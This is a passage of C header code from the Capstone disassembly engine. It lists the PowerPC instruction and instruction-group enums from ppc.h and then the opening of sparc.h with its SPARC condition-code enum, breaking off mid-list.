	PPC_INS_EVEQV,
	PPC_INS_EVEXTSB,
	PPC_INS_EVEXTSH,
	PPC_INS_EVLDD,
	PPC_INS_EVLDDX,
	PPC_INS_EVLDH,
	PPC_INS_EVLDHX,
	PPC_INS_EVLDW,
	PPC_INS_EVLDWX,
	PPC_INS_EVLHHESPLAT,
	PPC_INS_EVLHHESPLATX,
	PPC_INS_EVLHHOSSPLAT,
	PPC_INS_EVLHHOSSPLATX,
	PPC_INS_EVLHHOUSPLAT,
	PPC_INS_EVLHHOUSPLATX,
	PPC_INS_EVLWHE,
	PPC_INS_EVLWHEX,
	PPC_INS_EVLWHOS,
	PPC_INS_EVLWHOSX,
	PPC_INS_EVLWHOU,
	PPC_INS_EVLWHOUX,
	PPC_INS_EVLWHSPLAT,
	PPC_INS_EVLWHSPLATX,
	PPC_INS_EVLWWSPLAT,
	PPC_INS_EVLWWSPLATX,
	PPC_INS_EVMERGEHI,
	PPC_INS_EVMERGEHILO,
	PPC_INS_EVMERGELO,
	PPC_INS_EVMERGELOHI,
	PPC_INS_EVMHEGSMFAA,
	PPC_INS_EVMHEGSMFAN,
	PPC_INS_EVMHEGSMIAA,
	PPC_INS_EVMHEGSMIAN,
	PPC_INS_EVMHEGUMIAA,
	PPC_INS_EVMHEGUMIAN,
	PPC_INS_EVMHESMF,
	PPC_INS_EVMHESMFA,
	PPC_INS_EVMHESMFAAW,
	PPC_INS_EVMHESMFANW,
	PPC_INS_EVMHESMI,
	PPC_INS_EVMHESMIA,
	PPC_INS_EVMHESMIAAW,
	PPC_INS_EVMHESMIANW,
	PPC_INS_EVMHESSF,
	PPC_INS_EVMHESSFA,
	PPC_INS_EVMHESSFAAW,
	PPC_INS_EVMHESSFANW,
	PPC_INS_EVMHESSIAAW,
	PPC_INS_EVMHESSIANW,
	PPC_INS_EVMHEUMI,
	PPC_INS_EVMHEUMIA,
	PPC_INS_EVMHEUMIAAW,
	PPC_INS_EVMHEUMIANW,
	PPC_INS_EVMHEUSIAAW,
	PPC_INS_EVMHEUSIANW,
	PPC_INS_EVMHOGSMFAA,
	PPC_INS_EVMHOGSMFAN,
	PPC_INS_EVMHOGSMIAA,
	PPC_INS_EVMHOGSMIAN,
	PPC_INS_EVMHOGUMIAA,
	PPC_INS_EVMHOGUMIAN,
	PPC_INS_EVMHOSMF,
	PPC_INS_EVMHOSMFA,
	PPC_INS_EVMHOSMFAAW,
	PPC_INS_EVMHOSMFANW,
	PPC_INS_EVMHOSMI,
	PPC_INS_EVMHOSMIA,
	PPC_INS_EVMHOSMIAAW,
	PPC_INS_EVMHOSMIANW,
	PPC_INS_EVMHOSSF,
	PPC_INS_EVMHOSSFA,
	PPC_INS_EVMHOSSFAAW,
	PPC_INS_EVMHOSSFANW,
	PPC_INS_EVMHOSSIAAW,
	PPC_INS_EVMHOSSIANW,
	PPC_INS_EVMHOUMI,
	PPC_INS_EVMHOUMIA,
	PPC_INS_EVMHOUMIAAW,
	PPC_INS_EVMHOUMIANW,
	PPC_INS_EVMHOUSIAAW,
	PPC_INS_EVMHOUSIANW,
	PPC_INS_EVMRA,
	PPC_INS_EVMWHSMF,
	PPC_INS_EVMWHSMFA,
	PPC_INS_EVMWHSMI,
	PPC_INS_EVMWHSMIA,
	PPC_INS_EVMWHSSF,
	PPC_INS_EVMWHSSFA,
	PPC_INS_EVMWHUMI,
	PPC_INS_EVMWHUMIA,
	PPC_INS_EVMWLSMIAAW,
	PPC_INS_EVMWLSMIANW,
	PPC_INS_EVMWLSSIAAW,
	PPC_INS_EVMWLSSIANW,
	PPC_INS_EVMWLUMI,
	PPC_INS_EVMWLUMIA,
	PPC_INS_EVMWLUMIAAW,
	PPC_INS_EVMWLUMIANW,
	PPC_INS_EVMWLUSIAAW,
	PPC_INS_EVMWLUSIANW,
	PPC_INS_EVMWSMF,
	PPC_INS_EVMWSMFA,
	PPC_INS_EVMWSMFAA,
	PPC_INS_EVMWSMFAN,
	PPC_INS_EVMWSMI,
	PPC_INS_EVMWSMIA,
	PPC_INS_EVMWSMIAA,
	PPC_INS_EVMWSMIAN,
	PPC_INS_EVMWSSF,
	PPC_INS_EVMWSSFA,
	PPC_INS_EVMWSSFAA,
	PPC_INS_EVMWSSFAN,
	PPC_INS_EVMWUMI,
	PPC_INS_EVMWUMIA,
	PPC_INS_EVMWUMIAA,
	PPC_INS_EVMWUMIAN,
	PPC_INS_EVNAND,
	PPC_INS_EVNEG,
	PPC_INS_EVNOR,
	PPC_INS_EVOR,
	PPC_INS_EVORC,
	PPC_INS_EVRLW,
	PPC_INS_EVRLWI,
	PPC_INS_EVRNDW,
	PPC_INS_EVSLW,
	PPC_INS_EVSLWI,
	PPC_INS_EVSPLATFI,
	PPC_INS_EVSPLATI,
	PPC_INS_EVSRWIS,
	PPC_INS_EVSRWIU,
	PPC_INS_EVSRWS,
	PPC_INS_EVSRWU,
	PPC_INS_EVSTDD,
	PPC_INS_EVSTDDX,
	PPC_INS_EVSTDH,
	PPC_INS_EVSTDHX,
	PPC_INS_EVSTDW,
	PPC_INS_EVSTDWX,
	PPC_INS_EVSTWHE,
	PPC_INS_EVSTWHEX,
	PPC_INS_EVSTWHO,
	PPC_INS_EVSTWHOX,
	PPC_INS_EVSTWWE,
	PPC_INS_EVSTWWEX,
	PPC_INS_EVSTWWO,
	PPC_INS_EVSTWWOX,
	PPC_INS_EVSUBFSMIAAW,
	PPC_INS_EVSUBFSSIAAW,
	PPC_INS_EVSUBFUMIAAW,
	PPC_INS_EVSUBFUSIAAW,
	PPC_INS_EVSUBFW,
	PPC_INS_EVSUBIFW,
	PPC_INS_EVXOR,
	PPC_INS_EXTSB,
	PPC_INS_EXTSH,
	PPC_INS_EXTSW,
	PPC_INS_FABS,
	PPC_INS_FADD,
	PPC_INS_FADDS,
	PPC_INS_FCFID,
	PPC_INS_FCFIDS,
	PPC_INS_FCFIDU,
	PPC_INS_FCFIDUS,
	PPC_INS_FCMPU,
	PPC_INS_FCPSGN,
	PPC_INS_FCTID,
	PPC_INS_FCTIDUZ,
	PPC_INS_FCTIDZ,
	PPC_INS_FCTIW,
	PPC_INS_FCTIWUZ,
	PPC_INS_FCTIWZ,
	PPC_INS_FDIV,
	PPC_INS_FDIVS,
	PPC_INS_FMADD,
	PPC_INS_FMADDS,
	PPC_INS_FMR,
	PPC_INS_FMSUB,
	PPC_INS_FMSUBS,
	PPC_INS_FMUL,
	PPC_INS_FMULS,
	PPC_INS_FNABS,
	PPC_INS_FNEG,
	PPC_INS_FNMADD,
	PPC_INS_FNMADDS,
	PPC_INS_FNMSUB,
	PPC_INS_FNMSUBS,
	PPC_INS_FRE,
	PPC_INS_FRES,
	PPC_INS_FRIM,
	PPC_INS_FRIN,
	PPC_INS_FRIP,
	PPC_INS_FRIZ,
	PPC_INS_FRSP,
	PPC_INS_FRSQRTE,
	PPC_INS_FRSQRTES,
	PPC_INS_FSEL,
	PPC_INS_FSQRT,
	PPC_INS_FSQRTS,
	PPC_INS_FSUB,
	PPC_INS_FSUBS,
	PPC_INS_ICBI,
	PPC_INS_ICCCI,
	PPC_INS_ISEL,
	PPC_INS_ISYNC,
	PPC_INS_LA,
	PPC_INS_LBZ,
	PPC_INS_LBZU,
	PPC_INS_LBZUX,
	PPC_INS_LBZX,
	PPC_INS_LD,
	PPC_INS_LDARX,
	PPC_INS_LDBRX,
	PPC_INS_LDU,
	PPC_INS_LDUX,
	PPC_INS_LDX,
	PPC_INS_LFD,
	PPC_INS_LFDU,
	PPC_INS_LFDUX,
	PPC_INS_LFDX,
	PPC_INS_LFIWAX,
	PPC_INS_LFIWZX,
	PPC_INS_LFS,
	PPC_INS_LFSU,
	PPC_INS_LFSUX,
	PPC_INS_LFSX,
	PPC_INS_LHA,
	PPC_INS_LHAU,
	PPC_INS_LHAUX,
	PPC_INS_LHAX,
	PPC_INS_LHBRX,
	PPC_INS_LHZ,
	PPC_INS_LHZU,
	PPC_INS_LHZUX,
	PPC_INS_LHZX,
	PPC_INS_LI,
	PPC_INS_LIS,
	PPC_INS_LMW,
	PPC_INS_LSWI,
	PPC_INS_LVEBX,
	PPC_INS_LVEHX,
	PPC_INS_LVEWX,
	PPC_INS_LVSL,
	PPC_INS_LVSR,
	PPC_INS_LVX,
	PPC_INS_LVXL,
	PPC_INS_LWA,
	PPC_INS_LWARX,
	PPC_INS_LWAUX,
	PPC_INS_LWAX,
	PPC_INS_LWBRX,
	PPC_INS_LWZ,
	PPC_INS_LWZU,
	PPC_INS_LWZUX,
	PPC_INS_LWZX,
	PPC_INS_LXSDX,
	PPC_INS_LXVD2X,
	PPC_INS_LXVDSX,
	PPC_INS_LXVW4X,
	PPC_INS_MBAR,
	PPC_INS_MCRF,
	PPC_INS_MFCR,
	PPC_INS_MFCTR,
	PPC_INS_MFDCR,
	PPC_INS_MFFS,
	PPC_INS_MFLR,
	PPC_INS_MFMSR,
	PPC_INS_MFOCRF,
	PPC_INS_MFSPR,
	PPC_INS_MFSR,
	PPC_INS_MFSRIN,
	PPC_INS_MFTB,
	PPC_INS_MFVSCR,
	PPC_INS_MSYNC,
	PPC_INS_MTCRF,
	PPC_INS_MTCTR,
	PPC_INS_MTDCR,
	PPC_INS_MTFSB0,
	PPC_INS_MTFSB1,
	PPC_INS_MTFSF,
	PPC_INS_MTLR,
	PPC_INS_MTMSR,
	PPC_INS_MTMSRD,
	PPC_INS_MTOCRF,
	PPC_INS_MTSPR,
	PPC_INS_MTSR,
	PPC_INS_MTSRIN,
	PPC_INS_MTVSCR,
	PPC_INS_MULHD,
	PPC_INS_MULHDU,
	PPC_INS_MULHW,
	PPC_INS_MULHWU,
	PPC_INS_MULLD,
	PPC_INS_MULLI,
	PPC_INS_MULLW,
	PPC_INS_NAND,
	PPC_INS_NEG,
	PPC_INS_NOP,
	PPC_INS_ORI,
	PPC_INS_NOR,
	PPC_INS_OR,
	PPC_INS_ORC,
	PPC_INS_ORIS,
	PPC_INS_POPCNTD,
	PPC_INS_POPCNTW,
	PPC_INS_RFCI,
	PPC_INS_RFDI,
	PPC_INS_RFI,
	PPC_INS_RFID,
	PPC_INS_RFMCI,
	PPC_INS_RLDCL,
	PPC_INS_RLDCR,
	PPC_INS_RLDIC,
	PPC_INS_RLDICL,
	PPC_INS_RLDICR,
	PPC_INS_RLDIMI,
	PPC_INS_RLWIMI,
	PPC_INS_RLWINM,
	PPC_INS_RLWNM,
	PPC_INS_SC,
	PPC_INS_SLBIA,
	PPC_INS_SLBIE,
	PPC_INS_SLBMFEE,
	PPC_INS_SLBMTE,
	PPC_INS_SLD,
	PPC_INS_SLW,
	PPC_INS_SRAD,
	PPC_INS_SRADI,
	PPC_INS_SRAW,
	PPC_INS_SRAWI,
	PPC_INS_SRD,
	PPC_INS_SRW,
	PPC_INS_STB,
	PPC_INS_STBU,
	PPC_INS_STBUX,
	PPC_INS_STBX,
	PPC_INS_STD,
	PPC_INS_STDBRX,
	PPC_INS_STDCX,
	PPC_INS_STDU,
	PPC_INS_STDUX,
	PPC_INS_STDX,
	PPC_INS_STFD,
	PPC_INS_STFDU,
	PPC_INS_STFDUX,
	PPC_INS_STFDX,
	PPC_INS_STFIWX,
	PPC_INS_STFS,
	PPC_INS_STFSU,
	PPC_INS_STFSUX,
	PPC_INS_STFSX,
	PPC_INS_STH,
	PPC_INS_STHBRX,
	PPC_INS_STHU,
	PPC_INS_STHUX,
	PPC_INS_STHX,
	PPC_INS_STMW,
	PPC_INS_STSWI,
	PPC_INS_STVEBX,
	PPC_INS_STVEHX,
	PPC_INS_STVEWX,
	PPC_INS_STVX,
	PPC_INS_STVXL,
	PPC_INS_STW,
	PPC_INS_STWBRX,
	PPC_INS_STWCX,
	PPC_INS_STWU,
	PPC_INS_STWUX,
	PPC_INS_STWX,
	PPC_INS_STXSDX,
	PPC_INS_STXVD2X,
	PPC_INS_STXVW4X,
	PPC_INS_SUBF,
	PPC_INS_SUBFC,
	PPC_INS_SUBFE,
	PPC_INS_SUBFIC,
	PPC_INS_SUBFME,
	PPC_INS_SUBFZE,
	PPC_INS_SYNC,
	PPC_INS_TD,
	PPC_INS_TDI,
	PPC_INS_TLBIA,
	PPC_INS_TLBIE,
	PPC_INS_TLBIEL,
	PPC_INS_TLBIVAX,
	PPC_INS_TLBLD,
	PPC_INS_TLBLI,
	PPC_INS_TLBRE,
	PPC_INS_TLBSX,
	PPC_INS_TLBSYNC,
	PPC_INS_TLBWE,
	PPC_INS_TRAP,
	PPC_INS_TW,
	PPC_INS_TWI,
	PPC_INS_VADDCUW,
	PPC_INS_VADDFP,
	PPC_INS_VADDSBS,
	PPC_INS_VADDSHS,
	PPC_INS_VADDSWS,
	PPC_INS_VADDUBM,
	PPC_INS_VADDUBS,
	PPC_INS_VADDUHM,
	PPC_INS_VADDUHS,
	PPC_INS_VADDUWM,
	PPC_INS_VADDUWS,
	PPC_INS_VAND,
	PPC_INS_VANDC,
	PPC_INS_VAVGSB,
	PPC_INS_VAVGSH,
	PPC_INS_VAVGSW,
	PPC_INS_VAVGUB,
	PPC_INS_VAVGUH,
	PPC_INS_VAVGUW,
	PPC_INS_VCFSX,
	PPC_INS_VCFUX,
	PPC_INS_VCMPBFP,
	PPC_INS_VCMPEQFP,
	PPC_INS_VCMPEQUB,
	PPC_INS_VCMPEQUH,
	PPC_INS_VCMPEQUW,
	PPC_INS_VCMPGEFP,
	PPC_INS_VCMPGTFP,
	PPC_INS_VCMPGTSB,
	PPC_INS_VCMPGTSH,
	PPC_INS_VCMPGTSW,
	PPC_INS_VCMPGTUB,
	PPC_INS_VCMPGTUH,
	PPC_INS_VCMPGTUW,
	PPC_INS_VCTSXS,
	PPC_INS_VCTUXS,
	PPC_INS_VEXPTEFP,
	PPC_INS_VLOGEFP,
	PPC_INS_VMADDFP,
	PPC_INS_VMAXFP,
	PPC_INS_VMAXSB,
	PPC_INS_VMAXSH,
	PPC_INS_VMAXSW,
	PPC_INS_VMAXUB,
	PPC_INS_VMAXUH,
	PPC_INS_VMAXUW,
	PPC_INS_VMHADDSHS,
	PPC_INS_VMHRADDSHS,
	PPC_INS_VMINFP,
	PPC_INS_VMINSB,
	PPC_INS_VMINSH,
	PPC_INS_VMINSW,
	PPC_INS_VMINUB,
	PPC_INS_VMINUH,
	PPC_INS_VMINUW,
	PPC_INS_VMLADDUHM,
	PPC_INS_VMRGHB,
	PPC_INS_VMRGHH,
	PPC_INS_VMRGHW,
	PPC_INS_VMRGLB,
	PPC_INS_VMRGLH,
	PPC_INS_VMRGLW,
	PPC_INS_VMSUMMBM,
	PPC_INS_VMSUMSHM,
	PPC_INS_VMSUMSHS,
	PPC_INS_VMSUMUBM,
	PPC_INS_VMSUMUHM,
	PPC_INS_VMSUMUHS,
	PPC_INS_VMULESB,
	PPC_INS_VMULESH,
	PPC_INS_VMULEUB,
	PPC_INS_VMULEUH,
	PPC_INS_VMULOSB,
	PPC_INS_VMULOSH,
	PPC_INS_VMULOUB,
	PPC_INS_VMULOUH,
	PPC_INS_VNMSUBFP,
	PPC_INS_VNOR,
	PPC_INS_VOR,
	PPC_INS_VPERM,
	PPC_INS_VPKPX,
	PPC_INS_VPKSHSS,
	PPC_INS_VPKSHUS,
	PPC_INS_VPKSWSS,
	PPC_INS_VPKSWUS,
	PPC_INS_VPKUHUM,
	PPC_INS_VPKUHUS,
	PPC_INS_VPKUWUM,
	PPC_INS_VPKUWUS,
	PPC_INS_VREFP,
	PPC_INS_VRFIM,
	PPC_INS_VRFIN,
	PPC_INS_VRFIP,
	PPC_INS_VRFIZ,
	PPC_INS_VRLB,
	PPC_INS_VRLH,
	PPC_INS_VRLW,
	PPC_INS_VRSQRTEFP,
	PPC_INS_VSEL,
	PPC_INS_VSL,
	PPC_INS_VSLB,
	PPC_INS_VSLDOI,
	PPC_INS_VSLH,
	PPC_INS_VSLO,
	PPC_INS_VSLW,
	PPC_INS_VSPLTB,
	PPC_INS_VSPLTH,
	PPC_INS_VSPLTISB,
	PPC_INS_VSPLTISH,
	PPC_INS_VSPLTISW,
	PPC_INS_VSPLTW,
	PPC_INS_VSR,
	PPC_INS_VSRAB,
	PPC_INS_VSRAH,
	PPC_INS_VSRAW,
	PPC_INS_VSRB,
	PPC_INS_VSRH,
	PPC_INS_VSRO,
	PPC_INS_VSRW,
	PPC_INS_VSUBCUW,
	PPC_INS_VSUBFP,
	PPC_INS_VSUBSBS,
	PPC_INS_VSUBSHS,
	PPC_INS_VSUBSWS,
	PPC_INS_VSUBUBM,
	PPC_INS_VSUBUBS,
	PPC_INS_VSUBUHM,
	PPC_INS_VSUBUHS,
	PPC_INS_VSUBUWM,
	PPC_INS_VSUBUWS,
	PPC_INS_VSUM2SWS,
	PPC_INS_VSUM4SBS,
	PPC_INS_VSUM4SHS,
	PPC_INS_VSUM4UBS,
	PPC_INS_VSUMSWS,
	PPC_INS_VUPKHPX,
	PPC_INS_VUPKHSB,
	PPC_INS_VUPKHSH,
	PPC_INS_VUPKLPX,
	PPC_INS_VUPKLSB,
	PPC_INS_VUPKLSH,
	PPC_INS_VXOR,
	PPC_INS_WAIT,
	PPC_INS_WRTEE,
	PPC_INS_WRTEEI,
	PPC_INS_XOR,
	PPC_INS_XORI,
	PPC_INS_XORIS,
	PPC_INS_XSABSDP,
	PPC_INS_XSADDDP,
	PPC_INS_XSCMPODP,
	PPC_INS_XSCMPUDP,
	PPC_INS_XSCPSGNDP,
	PPC_INS_XSCVDPSP,
	PPC_INS_XSCVDPSXDS,
	PPC_INS_XSCVDPSXWS,
	PPC_INS_XSCVDPUXDS,
	PPC_INS_XSCVDPUXWS,
	PPC_INS_XSCVSPDP,
	PPC_INS_XSCVSXDDP,
	PPC_INS_XSCVUXDDP,
	PPC_INS_XSDIVDP,
	PPC_INS_XSMADDADP,
	PPC_INS_XSMADDMDP,
	PPC_INS_XSMAXDP,
	PPC_INS_XSMINDP,
	PPC_INS_XSMSUBADP,
	PPC_INS_XSMSUBMDP,
	PPC_INS_XSMULDP,
	PPC_INS_XSNABSDP,
	PPC_INS_XSNEGDP,
	PPC_INS_XSNMADDADP,
	PPC_INS_XSNMADDMDP,
	PPC_INS_XSNMSUBADP,
	PPC_INS_XSNMSUBMDP,
	PPC_INS_XSRDPI,
	PPC_INS_XSRDPIC,
	PPC_INS_XSRDPIM,
	PPC_INS_XSRDPIP,
	PPC_INS_XSRDPIZ,
	PPC_INS_XSREDP,
	PPC_INS_XSRSQRTEDP,
	PPC_INS_XSSQRTDP,
	PPC_INS_XSSUBDP,
	PPC_INS_XSTDIVDP,
	PPC_INS_XSTSQRTDP,
	PPC_INS_XVABSDP,
	PPC_INS_XVABSSP,
	PPC_INS_XVADDDP,
	PPC_INS_XVADDSP,
	PPC_INS_XVCMPEQDP,
	PPC_INS_XVCMPEQSP,
	PPC_INS_XVCMPGEDP,
	PPC_INS_XVCMPGESP,
	PPC_INS_XVCMPGTDP,
	PPC_INS_XVCMPGTSP,
	PPC_INS_XVCPSGNDP,
	PPC_INS_XVCPSGNSP,
	PPC_INS_XVCVDPSP,
	PPC_INS_XVCVDPSXDS,
	PPC_INS_XVCVDPSXWS,
	PPC_INS_XVCVDPUXDS,
	PPC_INS_XVCVDPUXWS,
	PPC_INS_XVCVSPDP,
	PPC_INS_XVCVSPSXDS,
	PPC_INS_XVCVSPSXWS,
	PPC_INS_XVCVSPUXDS,
	PPC_INS_XVCVSPUXWS,
	PPC_INS_XVCVSXDDP,
	PPC_INS_XVCVSXDSP,
	PPC_INS_XVCVSXWDP,
	PPC_INS_XVCVSXWSP,
	PPC_INS_XVCVUXDDP,
	PPC_INS_XVCVUXDSP,
	PPC_INS_XVCVUXWDP,
	PPC_INS_XVCVUXWSP,
	PPC_INS_XVDIVDP,
	PPC_INS_XVDIVSP,
	PPC_INS_XVMADDADP,
	PPC_INS_XVMADDASP,
	PPC_INS_XVMADDMDP,
	PPC_INS_XVMADDMSP,
	PPC_INS_XVMAXDP,
	PPC_INS_XVMAXSP,
	PPC_INS_XVMINDP,
	PPC_INS_XVMINSP,
	PPC_INS_XVMSUBADP,
	PPC_INS_XVMSUBASP,
	PPC_INS_XVMSUBMDP,
	PPC_INS_XVMSUBMSP,
	PPC_INS_XVMULDP,
	PPC_INS_XVMULSP,
	PPC_INS_XVNABSDP,
	PPC_INS_XVNABSSP,
	PPC_INS_XVNEGDP,
	PPC_INS_XVNEGSP,
	PPC_INS_XVNMADDADP,
	PPC_INS_XVNMADDASP,
	PPC_INS_XVNMADDMDP,
	PPC_INS_XVNMADDMSP,
	PPC_INS_XVNMSUBADP,
	PPC_INS_XVNMSUBASP,
	PPC_INS_XVNMSUBMDP,
	PPC_INS_XVNMSUBMSP,
	PPC_INS_XVRDPI,
	PPC_INS_XVRDPIC,
	PPC_INS_XVRDPIM,
	PPC_INS_XVRDPIP,
	PPC_INS_XVRDPIZ,
	PPC_INS_XVREDP,
	PPC_INS_XVRESP,
	PPC_INS_XVRSPI,
	PPC_INS_XVRSPIC,
	PPC_INS_XVRSPIM,
	PPC_INS_XVRSPIP,
	PPC_INS_XVRSPIZ,
	PPC_INS_XVRSQRTEDP,
	PPC_INS_XVRSQRTESP,
	PPC_INS_XVSQRTDP,
	PPC_INS_XVSQRTSP,
	PPC_INS_XVSUBDP,
	PPC_INS_XVSUBSP,
	PPC_INS_XVTDIVDP,
	PPC_INS_XVTDIVSP,
	PPC_INS_XVTSQRTDP,
	PPC_INS_XVTSQRTSP,
	PPC_INS_XXLAND,
	PPC_INS_XXLANDC,
	PPC_INS_XXLNOR,
	PPC_INS_XXLOR,
	PPC_INS_XXLXOR,
	PPC_INS_XXMRGHW,
	PPC_INS_XXMRGLW,
	PPC_INS_XXPERMDI,
	PPC_INS_XXSEL,
	PPC_INS_XXSLDWI,
	PPC_INS_XXSPLTW,
	PPC_INS_BCA,
	PPC_INS_BCLA,

	// extra & alias instructions
	PPC_INS_SLWI,
	PPC_INS_SRWI,
	PPC_INS_SLDI,

	PPC_INS_BTA,
	PPC_INS_CRSET,
	PPC_INS_CRNOT,
	PPC_INS_CRMOVE,
	PPC_INS_CRCLR,
	PPC_INS_MFBR0,
	PPC_INS_MFBR1,
	PPC_INS_MFBR2,
	PPC_INS_MFBR3,
	PPC_INS_MFBR4,
	PPC_INS_MFBR5,
	PPC_INS_MFBR6,
	PPC_INS_MFBR7,
	PPC_INS_MFXER,
	PPC_INS_MFRTCU,
	PPC_INS_MFRTCL,
	PPC_INS_MFDSCR,
	PPC_INS_MFDSISR,
	PPC_INS_MFDAR,
	PPC_INS_MFSRR2,
	PPC_INS_MFSRR3,
	PPC_INS_MFCFAR,
	PPC_INS_MFAMR,
	PPC_INS_MFPID,
	PPC_INS_MFTBLO,
	PPC_INS_MFTBHI,
	PPC_INS_MFDBATU,
	PPC_INS_MFDBATL,
	PPC_INS_MFIBATU,
	PPC_INS_MFIBATL,
	PPC_INS_MFDCCR,
	PPC_INS_MFICCR,
	PPC_INS_MFDEAR,
	PPC_INS_MFESR,
	PPC_INS_MFSPEFSCR,
	PPC_INS_MFTCR,
	PPC_INS_MFASR,
	PPC_INS_MFPVR,
	PPC_INS_MFTBU,
	PPC_INS_MTCR,
	PPC_INS_MTBR0,
	PPC_INS_MTBR1,
	PPC_INS_MTBR2,
	PPC_INS_MTBR3,
	PPC_INS_MTBR4,
	PPC_INS_MTBR5,
	PPC_INS_MTBR6,
	PPC_INS_MTBR7,
	PPC_INS_MTXER,
	PPC_INS_MTDSCR,
	PPC_INS_MTDSISR,
	PPC_INS_MTDAR,
	PPC_INS_MTSRR2,
	PPC_INS_MTSRR3,
	PPC_INS_MTCFAR,
	PPC_INS_MTAMR,
	PPC_INS_MTPID,
	PPC_INS_MTTBL,
	PPC_INS_MTTBU,
	PPC_INS_MTTBLO,
	PPC_INS_MTTBHI,
	PPC_INS_MTDBATU,
	PPC_INS_MTDBATL,
	PPC_INS_MTIBATU,
	PPC_INS_MTIBATL,
	PPC_INS_MTDCCR,
	PPC_INS_MTICCR,
	PPC_INS_MTDEAR,
	PPC_INS_MTESR,
	PPC_INS_MTSPEFSCR,
	PPC_INS_MTTCR,
	PPC_INS_NOT,
	PPC_INS_MR,
	PPC_INS_ROTLD,
	PPC_INS_ROTLDI,
	PPC_INS_CLRLDI,
	PPC_INS_ROTLWI,
	PPC_INS_CLRLWI,
	PPC_INS_ROTLW,
	PPC_INS_SUB,
	PPC_INS_SUBC,
	PPC_INS_LWSYNC,
	PPC_INS_PTESYNC,
	PPC_INS_TDLT,
	PPC_INS_TDEQ,
	PPC_INS_TDGT,
	PPC_INS_TDNE,
	PPC_INS_TDLLT,
	PPC_INS_TDLGT,
	PPC_INS_TDU,
	PPC_INS_TDLTI,
	PPC_INS_TDEQI,
	PPC_INS_TDGTI,
	PPC_INS_TDNEI,
	PPC_INS_TDLLTI,
	PPC_INS_TDLGTI,
	PPC_INS_TDUI,
	PPC_INS_TLBREHI,
	PPC_INS_TLBRELO,
	PPC_INS_TLBWEHI,
	PPC_INS_TLBWELO,
	PPC_INS_TWLT,
	PPC_INS_TWEQ,
	PPC_INS_TWGT,
	PPC_INS_TWNE,
	PPC_INS_TWLLT,
	PPC_INS_TWLGT,
	PPC_INS_TWU,
	PPC_INS_TWLTI,
	PPC_INS_TWEQI,
	PPC_INS_TWGTI,
	PPC_INS_TWNEI,
	PPC_INS_TWLLTI,
	PPC_INS_TWLGTI,
	PPC_INS_TWUI,
	PPC_INS_WAITRSV,
	PPC_INS_WAITIMPL,
	PPC_INS_XNOP,
	PPC_INS_XVMOVDP,
	PPC_INS_XVMOVSP,
	PPC_INS_XXSPLTD,
	PPC_INS_XXMRGHD,
	PPC_INS_XXMRGLD,
	PPC_INS_XXSWAPD,
	PPC_INS_BT,
	PPC_INS_BF,
	PPC_INS_BDNZT,
	PPC_INS_BDNZF,
	PPC_INS_BDZF,
	PPC_INS_BDZT,
	PPC_INS_BFA,
	PPC_INS_BDNZTA,
	PPC_INS_BDNZFA,
	PPC_INS_BDZTA,
	PPC_INS_BDZFA,
	PPC_INS_BTCTR,
	PPC_INS_BFCTR,
	PPC_INS_BTCTRL,
	PPC_INS_BFCTRL,
	PPC_INS_BTL,
	PPC_INS_BFL,
	PPC_INS_BDNZTL,
	PPC_INS_BDNZFL,
	PPC_INS_BDZTL,
	PPC_INS_BDZFL,
	PPC_INS_BTLA,
	PPC_INS_BFLA,
	PPC_INS_BDNZTLA,
	PPC_INS_BDNZFLA,
	PPC_INS_BDZTLA,
	PPC_INS_BDZFLA,
	PPC_INS_BTLR,
	PPC_INS_BFLR,
	PPC_INS_BDNZTLR,
	PPC_INS_BDZTLR,
	PPC_INS_BDZFLR,
	PPC_INS_BTLRL,
	PPC_INS_BFLRL,
	PPC_INS_BDNZTLRL,
	PPC_INS_BDNZFLRL,
	PPC_INS_BDZTLRL,
	PPC_INS_BDZFLRL,

	PPC_INS_ENDING,   // <-- mark the end of the list of instructions
} ppc_insn;

//> Group of PPC instructions
typedef enum ppc_insn_group {
	PPC_GRP_INVALID = 0, // = CS_GRP_INVALID

	//> Generic groups
	// all jump instructions (conditional+direct+indirect jumps)
	PPC_GRP_JUMP,	// = CS_GRP_JUMP

	//> Architecture-specific groups
	PPC_GRP_ALTIVEC = 128,
	PPC_GRP_MODE32,
	PPC_GRP_MODE64,
	PPC_GRP_BOOKE,
	PPC_GRP_NOTBOOKE,
	PPC_GRP_SPE,
	PPC_GRP_VSX,
	PPC_GRP_E500,
	PPC_GRP_PPC4XX,
	PPC_GRP_PPC6XX,

	PPC_GRP_ENDING,   // <-- mark the end of the list of groups
} ppc_insn_group;

#ifdef __cplusplus
}
#endif

#endif

```

`libs/Capstone/include/sparc.h`:

```h
#ifndef CAPSTONE_SPARC_H
#define CAPSTONE_SPARC_H

/* Capstone Disassembly Engine */
/* By Nguyen Anh Quynh <aquynh@gmail.com>, 2014 */

#ifdef __cplusplus
extern "C" {
#endif

#include <stdint.h>
#include "platform.h"

// GCC SPARC toolchain has a default macro called "sparc" which breaks
// compilation
#undef sparc

#ifdef _MSC_VER
#pragma warning(disable:4201)
#endif

//> Enums corresponding to Sparc condition codes, both icc's and fcc's.
typedef enum sparc_cc {
	SPARC_CC_INVALID = 0,	// invalid CC (default)
	//> Integer condition codes
	SPARC_CC_ICC_A   =  8+256,  // Always
	SPARC_CC_ICC_N   =  0+256,  // Never
	SPARC_CC_ICC_NE  =  9+256,  // Not Equal
	SPARC_CC_ICC_E   =  1+256,  // Equal
	SPARC_CC_ICC_G   = 10+256,  // Greater
	SPARC_CC_ICC_LE  =  2+256,  // Less or Equal
	SPARC_CC_ICC_GE  = 11+256,  // Greater or Equal
	SPARC_CC_ICC_L   =  3+256,  // Less
	SPARC_CC_ICC_GU  = 12+256,  // Greater Unsigned
	SPARC_CC_ICC_LEU =  4+256,  // Less or Equal Unsigned
	SPARC_CC_ICC_CC  = 13+256,  // Carry Clear/Great or Equal Unsigned
	SPARC_CC_ICC_CS  =  5+256,  // Carry Set/Less Unsigned
	SPARC_CC_ICC_POS = 14+256,  // Positive
	SPARC_CC_ICC_NEG =  6+256,  // Negative
	SPARC_CC_ICC_VC  = 15+256,  // Overflow Clear
	SPARC_CC_ICC_VS  =  7+256,  // Overflow Set

	//> Floating condition codes
	SPARC_CC_FCC_A   =  8+16+256,  // Always
	SPARC_CC_FCC_N   =  0+16+256,  // Never
	SPARC_CC_FCC_U   =  7+16+256,  // Unordered
	SPARC_CC_FCC_G   =  6+16+256,  // Greater
	SPARC_CC_FCC_UG  =  5+16+256,  // Unordered or Greater
	SPARC_CC_FCC_L   =  4+16+256,  // Less
	SPARC_CC_FCC_UL  =  3+16+256,  // Unordered or Less
	SPARC_CC_FCC_LG  =  2+16+256,  // Less or Greater
